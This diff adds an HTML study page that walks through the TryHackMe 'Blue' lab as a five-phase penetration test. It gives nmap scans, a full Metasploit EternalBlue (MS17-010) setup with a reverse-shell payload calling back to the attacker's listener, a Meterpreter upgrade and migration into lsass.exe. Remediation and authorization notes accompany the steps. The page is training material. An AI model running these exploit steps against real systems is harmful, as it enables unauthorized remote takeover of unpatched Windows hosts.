@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical Hacking & Security Dashboard</title>
+    <style>
+        :root {
+            --bg-primary: #0f172a;
+            --bg-secondary: #1e293b;
+            --accent-color: #38bdf8;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border-color: #334155;
+            --code-bg: #020617;
+            --card-radius: 12px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-main);
+            line-height: 1.6;
+            padding: 20px;
+        }
+
+        .dashboard-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 24px;
+        }
+
+        @media (min-width: 768px) {
+            .dashboard-container {
+                grid-template-columns: 2fr 1fr;
+            }
+        }
+
+        header {
+            grid-column: 1 / -1;
+            background: var(--bg-secondary);
+            padding: 24px;
+            border-radius: var(--card-radius);
+            border: 1px solid var(--border-color);
+        }
+
+        header h1 {
+            color: var(--accent-color);
+            font-size: 1.8rem;
+            margin-bottom: 8px;
+        }
+
+        header p {
+            color: var(--text-muted);
+        }
+
+        .content-section {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .card {
+            background: var(--bg-secondary);
+            padding: 24px;
+            border-radius: var(--card-radius);
+            border: 1px solid var(--border-color);
+        }
+
+        .card h2 {
+            font-size: 1.3rem;
+            margin-bottom: 12px;
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 8px;
+            color: var(--accent-color);
+        }
+
+        .card h3 {
+            font-size: 1.1rem;
+            margin-top: 16px;
+            margin-bottom: 8px;
+            color: #e2e8f0;
+        }
+
+        .card p, .card ul, .card ol {
+            color: var(--text-muted);
+            margin-bottom: 12px;
+        }
+
+        .card ul, .card ol {
+            margin-left: 20px;
+        }
+
+        code {
+            background-color: var(--code-bg);
+            color: #38bdf8;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 0.95rem;
+        }
+
+        pre {
+            background-color: var(--code-bg);
+            color: #f1f5f9;
+            padding: 12px;
+            border-radius: 6px;
+            overflow-x: auto;
+            margin: 10px 0;
+            border: 1px solid var(--border-color);
+            font-family: monospace;
+        }
+
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .quote-box {
+            background: rgba(56, 189, 248, 0.1);
+            border-left: 4px solid var(--accent-color);
+            padding: 16px;
+            margin-top: 12px;
+            font-style: italic;
+        }
+
+        footer {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 20px;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="dashboard-container">
+        
+        <!-- HEADER SECTION -->
+        <header>
+            <h1>5-Phase Penetration Testing Study Guide</h1>
+            <p>Hands-on walk-through based on the TryHackMe "Blue" machine tutorial.</p>
+        </header>
+
+        <!-- MAIN CONTENT AREA -->
+        <main class="content-section">
+            
+            <!-- SECTION 1: Core Methodology -->
+            <article class="card">
+                <h2>The 5-Phase Methodology (Deep-Dive)</h2>
+                <ol style="margin-left: 20px;">
+                    <li>
+                        <strong>Phase 1: Reconnaissance (Information Gathering)</strong><br>
+                        Acquiring actionable intelligence without intrusive contact. Includes <em>Passive Reconnaissance</em> (WHOIS, DNS zone transfers via <code>dig</code>, GHDB dorks, subdomains via <code>amass</code>) and <em>Active Reconnaissance</em> (direct host probes, banner grabbing, footprinting public services) under explicit Rules of Engagement (RoE).
+                    </li>
+                    <li style="margin-top: 10px;">
+                        <strong>Phase 2: Scanning &amp; Enumeration (Network Mapping)</strong><br>
+                        Converting IP addresses into targets by probing TCP/UDP ports (<code>0&ndash;65535</code>) for status (<code>open</code>, <code>closed</code>, <code>filtered</code>), identifying service banners/OS fingerprints, and mapping version numbers to CVE databases using Nmap NSE scripts.
+                    </li>
+                    <li style="margin-top: 10px;">
+                        <strong>Phase 3: Exploitation (Gaining Access)</strong><br>
+                        Leveraging software misconfigurations or unpatched vulnerabilities (e.g., MS17-010 / CVE-2017-0144). Stages payloads (inline shellcode or reverse shells) to establish a back-channel communication link while bypassing endpoint defenses without crashing the target.
+                    </li>
+                    <li style="margin-top: 10px;">
+                        <strong>Phase 4: Access Maintenance &amp; Post-Exploitation</strong><br>
+                        Solidifying access by escalating privileges from low-rights service accounts (e.g., <code>www-data</code>) to administrative levels (<code>NT AUTHORITY\SYSTEM</code> or <code>root</code>), upgrading command shells to encrypted C2 agents (Meterpreter), dumping hashes via Mimikatz, and pivoting across internal subnets.
+                    </li>
+                    <li style="margin-top: 10px;">
+                        <strong>Phase 5: Reporting &amp; Remediation Guidance</strong><br>
+                        Translating technical exploits into actionable business intelligence with step-by-step PoC logs, CVSS v3/v4 severity ratings, operational impact analysis, and direct patching links (e.g., KB4012598).
+                    </li>
+                </ol>
+            </article>
+
+            <!-- SECTION 2: Environment Setup -->
+            <article class="card">
+                <h2>Lab Environment Setup</h2>
+                <p>Follow these steps on <a href="https://tryhackme.com" style="color: var(--accent-color);">TryHackMe</a>:</p>
+                <ul>
+                    <li>Search for and open the <strong>Blue</strong> room.</li>
+                    <li>Click <strong>Start Machine</strong> to retrieve your Target IP Address (e.g., <code>10.10.x.x</code>).</li>
+                    <li>Click <strong>Start AttackBox</strong> to launch the in-browser terminal environment.</li>
+                    <li>Open the terminal window and test basic terminal interaction:
+                        <pre>whoami</pre>
+                    </li>
+                </ul>
+            </article>
+
+            <!-- SECTION 3: Detailed Phase Walkthrough -->
+            <article class="card">
+                <h2>Step-by-Step Technical Walkthrough</h2>
+
+                <h3>Phase 1 &amp; 2: Network Scanning &amp; Enumeration</h3>
+                <p>Execute targeted Nmap scans to map active network interfaces and service vulnerabilities:</p>
+                <pre><code># 1. Fast initial port discovery scan (top 1000 ports)
+nmap -sS --min-rate 5000 [TARGET_IP]
+
+# 2. Comprehensive service version detection scan across open ports
+nmap -sV -p 135,139,445 [TARGET_IP]
+
+# 3. Targeted vulnerability assessment script for MS17-010 (EternalBlue)
+nmap -sC -p 445 --script smb-vuln-ms17-010 [TARGET_IP]</code></pre>
+
+                <p><strong>Nmap Flag Reference:</strong></p>
+                <ul>
+                    <li><code>-sS</code> &mdash; Stealth SYN scan; sends TCP SYN packets without completing the 3-way handshake to minimize logging.</li>
+                    <li><code>-sV</code> &mdash; Service Version detection; sends protocol-specific probes to extract exact version strings.</li>
+                    <li><code>-sC</code> &mdash; Safe Default Scripts; runs standard Nmap scripts for basic vulnerability checking.</li>
+                    <li><code>--script smb-vuln-ms17-010</code> &mdash; Directly queries SMBv1 endpoints for Remote Code Execution exposure.</li>
+                </ul>
+
+                <h3>Phase 3: Exploitation Configuration</h3>
+                <pre><code># Search offline Exploit Database repositories
+searchsploit smb windows | grep -i "EternalBlue"
+
+# Launch and configure Metasploit Framework
+msfconsole -q
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Define module environment parameters
+set RHOSTS [TARGET_IP]
+set LHOST [ATTACKBOX_IP]
+set LPORT 4444
+set PAYLOAD windows/x64/shell/reverse_tcp
+
+# Verify vulnerability status before payload delivery
+check
+exploit</code></pre>
+
+                <h3>Phase 4: Post-Exploitation &amp; Process Migration</h3>
+                <pre><code># Step 1: Background the current basic command shell
+CTRL + Z  (Type 'y' and press Enter)
+
+# Step 2: Convert shell to full Meterpreter session
+use post/multi/manage/shell_to_meterpreter
+show options
+set SESSION 1
+set LHOST [ATTACKBOX_IP]
+run
+
+# Step 3: Interact with upgraded session &amp; verify privilege level
+sessions -i 2
+getuid
+# Expected output: NT AUTHORITY\SYSTEM
+
+# Step 4: Stabilize C2 session by migrating into a system process
+ps
+migrate [PROCESS_ID]  # e.g., lsass.exe or services.exe PID
+
+# Step 5: System Reconnaissance &amp; Flag Extraction
+shell
+whoami /all
+dir /s C:\flag*
+type C:\flag1.txt</code></pre>
+            </article>
+
+            <!-- CARD: NMAP REFERENCE -->
+            <article class="card">
+                <h2>Nmap Command Flags Reference</h2>
+                <p>Key Nmap options used during the scanning phase:</p>
+                <ul>
+                    <li><code>-sV</code> &mdash; Service Version Detection: Probes open ports to determine service/version info.</li>
+                    <li><code>-sC</code> &mdash; Default Scripts: Runs a collection of standard Nmap Scripts (NSE) for basic checks.</li>
+                    <li><code>-p [port]</code> &mdash; Target Port: Specifies a single port or range (e.g., <code>-p 445</code> or <code>-p 1-1024</code>).</li>
+                    <li><code>--script [name]</code> &mdash; Specific Script: Runs a targeted NSE vulnerability detection script.</li>
+                </ul>
+            </article>
+
+            <!-- CARD: TROUBLESHOOTING -->
+            <article class="card">
+                <h2>Troubleshooting &amp; Common Fixes</h2>
+                <ul>
+                    <li><strong>Exploit Fails / No Session:</strong> MS17-010 (EternalBlue) can be timing-sensitive. Rerun <code>exploit</code> a second or third time.</li>
+                    <li><strong>LHOST Misconfiguration:</strong> Ensure <code>LHOST</code> is set to your AttackBox's IP address (often the <code>tun0</code> interface), not the target IP or localhost.</li>
+                    <li><strong>Target Unreachable:</strong> Verify the target machine hasn't timed out on TryHackMe. Ping the target IP to confirm connectivity.</li>
+                </ul>
+            </article>
+
+            <!-- CARD: WORKFLOW CHECKLIST -->
+            <article class="card">
+                <h2>Execution Checklist</h2>
+                <ol>
+                    <li>[ ] <strong>Verify Authorization:</strong> Confirm target IP is within the authorized scope.</li>
+                    <li>[ ] <strong>Scan Target:</strong> Run <code>nmap -sV -sC -p 445 [TARGET_IP]</code>.</li>
+                    <li>[ ] <strong>Confirm Vulnerability:</strong> Check output for <code>VULNERABLE</code> state on MS17-010.</li>
+                    <li>[ ] <strong>Configure Exploit:</strong> Set <code>RHOSTS</code> and <code>LHOST</code> in Metasploit.</li>
+                    <li>[ ] <strong>Execute &amp; Stabilize:</strong> Run <code>exploit</code>, upgrade shell to Meterpreter, and <code>migrate</code> process.</li>
+                    <li>[ ] <strong>Document Findings:</strong> Capture flags and record steps for the final report.</li>
+                </ol>
+            </article>
+
+            <!-- CARD: DEFENSIVE REMEDIATION -->
+            <article class="card">
+                <h2>Defensive Controls &amp; Remediation</h2>
+                <p>In cybersecurity, identifying a vulnerability must always lead to mitigation and defense. Key strategies for securing enterprise networks include:</p>
+                <ul>
+                    <li><strong>System Patching:</strong> Regularly applying security updates (such as Microsoft KB bulletins) to address known software flaws.</li>
+                    <li><strong>Disabling Legacy Protocols:</strong> Disabling outdated services (like SMBv1) that lack modern encryption and integrity checks.</li>
+                    <li><strong>Network Segmentation &amp; Firewalls:</strong> Restricting port access (e.g., blocking Port 445 externally) to limit internal service exposure.</li>
+                    <li><strong>Principle of Least Privilege:</strong> Ensuring services and applications execute with minimal required permissions rather than elevated system rights.</li>
+                </ul>
+            </article>
+
+            <!-- CARD: REPORTING FRAMEWORK -->
+            <article class="card">
+                <h2>Professional Reporting Structure</h2>
+                <p>A professional security assessment report delivers actionable value by detailing risks and steps for remediation:</p>
+                <ol>
+                    <li><strong>Executive Summary:</strong> High-level business impact overview tailored for leadership.</li>
+                    <li><strong>Scope &amp; Rules of Engagement:</strong> Clearly defined testing boundaries and authorization parameters.</li>
+                    <li><strong>Vulnerability Findings:</strong> Detailed technical breakdown, risk severity rating, and proof of concept.</li>
+                    <li><strong>Remediation Guidance:</strong> Step-by-step instructions for system administrators to resolve identified issues.</li>
+                </ol>
+            </article>
+
+        </main>
+
+        <!-- SIDEBAR -->
+        <aside class="sidebar">
+            
+            <section class="card">
+                <h2>Ethical Guiding Principles</h2>
+                <p>Only test systems you own or have explicit, written authorization to evaluate. Unsanctioned scanning or testing is illegal.</p>
+            </section>
+
+            <!-- CARD: TECHNICAL GLOSSARY -->
+            <section class="card">
+                <h2>Core Technical Terms &amp; Reference</h2>
+                <table style="width: 100%; border-collapse: collapse; font-size: 0.9rem; text-align: left;">
+                    <thead>
+                        <tr style="border-bottom: 2px solid var(--border-color); color: var(--accent-color);">
+                            <th style="padding: 6px;">Term</th>
+                            <th style="padding: 6px;">Category</th>
+                            <th style="padding: 6px;">Technical Purpose</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr style="border-bottom: 1px solid var(--border-color);">
+                            <td style="padding: 6px;"><code>IP Address</code></td>
+                            <td style="padding: 6px;">Network</td>
+                            <td style="padding: 6px;">32-bit (IPv4) or 128-bit (IPv6) numerical host identifier.</td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border-color);">
+                            <td style="padding: 6px;"><code>Port 445</code></td>
+                            <td style="padding: 6px;">Network</td>
+                            <td style="padding: 6px;">TCP channel dedicated to Microsoft SMB network file sharing.</td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border-color);">
+                            <td style="padding: 6px;"><code>RHOSTS / LHOST</code></td>
+                            <td style="padding: 6px;">Exploit</td>
+                            <td style="padding: 6px;">Remote Target IP (RHOSTS) vs Local Attacker Listener IP (LHOST).</td>
+                        </tr>
+                        <tr style="border-bottom: 1px solid var(--border-color);">
+                            <td style="padding: 6px;"><code>Meterpreter</code></td>
+                            <td style="padding: 6px;">Payload</td>
+                            <td style="padding: 6px;">In-memory DLL injection agent providing stealthy post-exploitation control.</td>
+                        </tr>
+                        <tr>
+                            <td style="padding: 6px;"><code>SYSTEM</code></td>
+                            <td style="padding: 6px;">Windows OS</td>
+                            <td style="padding: 6px;">Highest administrative privilege account in Windows environments.</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <section class="card">
+                <h2>Scripture & Reflection</h2>
+                <p><strong>Proverbs 11:3</strong></p>
+                <div class="quote-box">
+                    "The integrity of the upright guides them, but the unfaithful are destroyed by their duplicity."
+                </div>
+                <p style="margin-top: 12px; font-size: 0.95rem; color: var(--text-muted);">
+                    <strong>Lesson:</strong> Technical expertise carries accountability. Ethical security practices focus on remediation, protection, and maintaining high integrity.
+                </p>
+            </section>
+
+        </aside>
+
+        <!-- FOOTER -->
+        <footer>
+            <p>&copy; Educational Study Workspace — Built for clean readability and structured learning.</p>
+        </footer>
+
+    </div>
+
+</body>
+</html>
